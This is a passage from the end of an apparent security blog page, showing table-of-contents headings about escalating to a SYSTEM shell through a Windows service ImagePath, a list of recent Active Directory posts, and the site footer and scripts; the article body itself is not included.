class="toc-text">Modifying the Service ImagePath</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-the-Listener"><span class="toc-number">6.2.</span> <span class="toc-text">Starting the Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Restarting-the-Service-1"><span class="toc-number">6.3.</span> <span class="toc-text">Restarting the Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Getting-a-SYSTEM-Shell"><span class="toc-number">6.4.</span> <span class="toc-text">Getting a SYSTEM Shell</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
